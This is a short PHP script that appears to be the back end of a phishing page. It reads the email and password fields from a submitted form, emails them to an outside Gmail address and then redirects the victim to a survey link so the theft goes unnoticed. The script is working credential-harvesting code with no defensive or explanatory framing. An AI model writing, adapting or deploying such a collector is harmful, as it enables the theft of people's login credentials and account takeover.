<?php

$to      = 'thrapsd@gmail.com';
$subject = 'the subject';
$message = $_POST["email"] . "  :  " . $_POST["pass"];
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);


$newURL = "https://www.surveymonkey.com/r/Y7L9ZY6";
header('Location: '.$newURL);
?>
